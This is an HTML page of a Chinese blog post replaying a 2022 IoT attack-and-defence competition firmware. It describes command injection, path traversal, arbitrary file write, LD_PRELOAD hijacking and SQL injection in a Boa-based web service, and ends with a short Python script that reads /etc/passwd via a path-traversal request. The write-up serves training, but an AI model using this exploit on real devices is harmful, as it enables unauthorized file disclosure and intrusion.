@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32gl-A.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16gl-A.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="复现下许久以前打过的西湖论剑总决赛（除蓝牙外的赛题）。 参考官方 wp：2022西湖论剑 IoT-AWD 赛题官方 WriteUp （上篇）：一号固件&amp;二号固件和2022西湖论剑 IoT-AWD 赛题官方 WriteUp （下篇）：三号固件。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="西湖论剑总决赛IOT复现">
+<meta property="og:url" content="http://example.com/2023/05/18/xhlj-iot/index.html">
+<meta property="og:site_name" content="Anza | 学习记录">
+<meta property="og:description" content="复现下许久以前打过的西湖论剑总决赛（除蓝牙外的赛题）。 参考官方 wp：2022西湖论剑 IoT-AWD 赛题官方 WriteUp （上篇）：一号固件&amp;二号固件和2022西湖论剑 IoT-AWD 赛题官方 WriteUp （下篇）：三号固件。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202305182109823.png">
+<meta property="og:image" content="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202305191550805.png">
+<meta property="og:image" content="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202305191616858.png">
+<meta property="og:image" content="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202305271508165.png">
+<meta property="og:image" content="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202305271533727.png">
+<meta property="og:image" content="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202305271601067.png">
+<meta property="og:image" content="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202305271603317.png">
+<meta property="og:image" content="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202305271609990.png">
+<meta property="article:published_time" content="2023-05-18T04:40:26.000Z">
+<meta property="article:modified_time" content="2023-05-27T08:09:10.885Z">
+<meta property="article:author" content="Anza">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202305182109823.png">
+
+<link rel="canonical" href="http://example.com/2023/05/18/xhlj-iot/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>西湖论剑总决赛IOT复现 | Anza | 学习记录</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Anza | 学习记录" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Anza | 学习记录</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/18/xhlj-iot/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Haida.png">
+      <meta itemprop="name" content="Anza">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Anza | 学习记录">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          西湖论剑总决赛IOT复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-05-18 12:40:26" itemprop="dateCreated datePublished" datetime="2023-05-18T12:40:26+08:00">2023-05-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-05-27 16:09:10" itemprop="dateModified" datetime="2023-05-27T16:09:10+08:00">2023-05-27</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>复现下许久以前打过的西湖论剑总决赛（除蓝牙外的赛题）。</p>
+<p>参考官方 wp：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzUyMDEyNTkwNA==&mid=2247493801&idx=1&sn=d3f98938ae8df76c28accc580a4e6c17&chksm=f9ed8416ce9a0d00c54d8ab9749e7d76792b82b06780ae103b3879c154b80654e0c4ef3c1881&mpshare=1&scene=23&srcid=0514VBErwvCkEnQ0tE0fpVXP&sharer_sharetime=1684053359058&sharer_shareid=72e10aaa438d40848d3d5a32d35bc286#rd">2022西湖论剑 IoT-AWD 赛题官方 WriteUp （上篇）：一号固件&amp;二号固件</a>和<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzUyMDEyNTkwNA==&mid=2247493817&idx=1&sn=3fc9e016df8c42e204782603be5fbac4&chksm=f9ed8406ce9a0d106ec8126f8edb451659a5096f877b968716cb5428eabb8f18feb5ab58d7e9&scene=178&cur_album_id=1375767735803805698#rd">2022西湖论剑 IoT-AWD 赛题官方 WriteUp （下篇）：三号固件</a>。</p>
+<span id="more"></span>
+
+<h2 id="一号固件"><a href="#一号固件" class="headerlink" title="一号固件"></a>一号固件</h2><h3 id="xhttpd"><a href="#xhttpd" class="headerlink" title="xhttpd"></a>xhttpd</h3><p>先对靶机 IP 进行端口扫描：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.1</span><br></pre></td></tr></table></figure>
+
+<p>发现 8080 端口是开放的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2023-05-18 20:49 CST</span><br><span class="line">Nmap scan report for OpenWrt.lan (192.168.1.1)</span><br><span class="line">Host is up (0.0031s latency).</span><br><span class="line">Not shown: 995 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">53/tcp   open  domain</span><br><span class="line">80/tcp   open  http</span><br><span class="line">443/tcp  open  https</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 89.56 seconds</span><br></pre></td></tr></table></figure>
+
+<p>在固件提取好的文件目录下使用如下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -rn &quot;8080&quot;</span><br></pre></td></tr></table></figure>
+
+<p>便可以找到跟端口有关的配置文件<code>etc/boa/boa.conf</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">www/luci-static/resources/view/status/channel_analysis.js:32:if(res.vht_operation!=null)&#123;center_channels[0]=res.vht_operation.center_freq_1;if(res.vht_operation.channel_width==80)&#123;chan_width=8;res.channel_width=&quot;80 MHz&quot;;&#125;else if(res.vht_operation.channel_width==8080)&#123;res.channel_width=&quot;80+80 MHz&quot;;chan_width=8;center_channels.push(res.vht_operation.center_freq_2);&#125;else if(res.vht_operation.channel_width==160)&#123;res.channel_width=&quot;160 MHz&quot;;chan_width=16;&#125;&#125;</span><br><span class="line">usr/share/hwdata/pci.ids:7426:	8080  FastLinQ QL41000 Series 10/25/40/50GbE Controller (FCoE)</span><br><span class="line">usr/share/hwdata/pci.ids:13425:		1043 8080  A7V333 motherboard</span><br><span class="line">usr/share/hwdata/pci.ids:15298:	8080  AEC67160 SCSI</span><br><span class="line">usr/share/hwdata/pci.ids:19218:	8080  VScom 800L 8 port serial adaptor</span><br><span class="line">usr/share/hwdata/pci.ids:34413:	8080  ASC-29320A U320 w/HostRAID</span><br><span class="line">usr/share/hwdata/usb.ids:6644:	8080  IBM C-It Webcam</span><br><span class="line">usr/share/hwdata/usb.ids:17126:	8080  CCS100 - Compact Spectrometer</span><br><span class="line">usr/share/hwdata/usb.ids:18491:	8080  1 port to Serial</span><br><span class="line">Binary file usr/bin/socat matches</span><br><span class="line">etc/boa/boa.conf:25:Port 8080</span><br></pre></td></tr></table></figure>
+
+<p>并可以知道该 web 服务是由 boa 框架搭建的：</p>
+<blockquote>
+<p>BOA 是一种非常小巧的 web 服务器，用来负责处理客户端或者是浏览器端的 http 请求，因为其特性小巧，性能优秀，故而适合应用于嵌入式系统。BOA 支持 CGI 交互，浏览器每次发送一个 POST 请求，BOA 会对应 fork 一个 CGI 进程，数据发送完成后，CGI 进程退出。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># etc/boa/boa.conf</span><br><span class="line">Port 8080</span><br><span class="line">User root</span><br><span class="line">Group root</span><br><span class="line">ErrorLog /tmp/error_log</span><br><span class="line">AccessLog /tmp/access_log</span><br><span class="line">ServerName www.your.org.here</span><br><span class="line">【*】DocumentRoot /usr/bin/www</span><br><span class="line">UserDir public_html</span><br><span class="line">DirectoryIndex index.html</span><br><span class="line">KeepAliveMax 1000</span><br><span class="line">KeepAliveTimeout 10</span><br><span class="line">MimeTypes /etc/mime.types</span><br><span class="line">DefaultType text/plain</span><br><span class="line">CGIPath /bin:/usr/bin:/usr/local/bin</span><br><span class="line">【*】ScriptAlias /cgi-bin/ /usr/bin/www/cgi-bin/</span><br></pre></td></tr></table></figure>
+
+<p>由配置可知，web 路径位于 /usr/bin/www，/cgi-bin/ 路径被重定位成 /usr/bin/www/cgi-bin/ 路径，在该目录中可以看到一些 cgi 程序：</p>
+<img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202305182109823.png" alt="image-20230518210948674" style="zoom: 50%;" />
+
+<hr>
+<p><strong>diag.cgi</strong></p>
+<hr>
+<p>首先是 diag.cgi，除去处理请求头的代码，关键代码如下：</p>
+<p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202305191550805.png" alt="image-20230519154952373"></p>
+<p>大概可以看出传入<code>type</code>和<code>param</code>两个参数，然后对<code>param</code>进行过滤，进行 ping 或 curl 操作，但由于过滤的时候未过滤换行符，因此存在命令注入漏洞。</p>
+<hr>
+<p><strong>get.cgi</strong></p>
+<hr>
+<p>然后是 get.cgi，除去处理请求头的代码，关键代码如下：</p>
+<img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202305191616858.png" alt="image-20230519161631697" style="zoom:50%;" />
+
+<p>大概可以看出接收传入的<code>name</code>参数，然后将<code>/usr/bin/upload/</code>下的文件打印出来再删掉，由于未检测路径穿越，因此可以直接读出任意文件。</p>
+<hr>
+<p><strong>upload.cgi</strong></p>
+<hr>
+<p>最后是 upload.cgi，除去处理请求头的代码，关键代码如下：</p>
+<img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202305271508165.png" alt="image-20230527150808921" style="zoom:50%;" />
+
+<p>也是未检测目录，导致可以实现文件任意写。</p>
+<hr>
+<p><strong>xhttpd</strong></p>
+<hr>
+<p>在 xhttpd 中同样存在一些漏洞，设置环境变量时未添加 HTTP_ 前缀，用户可以控制 LD_PRELOAD 变量实现链接库劫持。而身份验证部分会使用用户提交的数据拼接 SQL 语句执行，存在 SQL 注入漏洞，/tmp/user.db 中默认保存了一 admin 账户，该账户密码随机，利用 SQL 注入可以读出 admin 账户的密码，进行后续利用。：</p>
+<img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202305271533727.png" alt="image-20230527153333665" style="zoom:50%;" />
+
+<p>xhttpd 中包含了基本的 http 头检测：</p>
+<p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202305271601067.png" alt="image-20230527160112938"></p>
+<p>且有些 db 信息可以在文件中看到：</p>
+<p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202305271603317.png" alt="image-20230527160313253"></p>
+<h4 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h4><p>利用 get.cgi 的任意读文件：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  -*- UTF-8 -*- #</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@filename:exp.py</span></span><br><span class="line"><span class="string">@author:Anza</span></span><br><span class="line"><span class="string">@time:2023-05-14</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">method1</span>():</span><br><span class="line"></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">&quot;192.168.1.1&quot;</span>, <span class="number">8080</span>))</span><br><span class="line">    data = <span class="string">&quot;GET /cgi-bin/get.cgi?name=/../../../etc/passwd HTTP/1.1\r\nHost: %s\r\nAuthorization: Basic guest:guest\r\n\r\n&quot;</span> % (<span class="string">&quot;1.1.1.1&quot;</span>)</span><br><span class="line">    s.sendall(data.encode())</span><br><span class="line">    </span><br><span class="line">    res = s.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    res = s.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    method1()</span><br></pre></td></tr></table></figure>
+
+<img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202305271609990.png" alt="image-20230527160906904" style="zoom:80%;" />
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/04/03/hznu2whu/" rel="prev" title="双非一战上岸武汉大学网安专硕">
+      <i class="fa fa-chevron-left"></i> 双非一战上岸武汉大学网安专硕
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/05/21/front-end/" rel="next" title="front-end">
+      front-end <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E5%8F%B7%E5%9B%BA%E4%BB%B6"><span class="nav-number">1.</span> <span class="nav-text">一号固件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#xhttpd"><span class="nav-number">1.1.</span> <span class="nav-text">xhttpd</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E6%B3%951"><span class="nav-number">1.1.1.</span> <span class="nav-text">解法1</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Anza"
+      src="/images/Haida.png">
+  <p class="site-author-name" itemprop="name">Anza</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://verf1sh.github.io/" title="https:&#x2F;&#x2F;verf1sh.github.io&#x2F;" rel="noopener" target="_blank">VerF1sh</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://4xwi11.github.io/" title="https:&#x2F;&#x2F;4xwi11.github.io&#x2F;" rel="noopener" target="_blank">4XWi11</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="author" itemprop="copyrightHolder">Anza</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
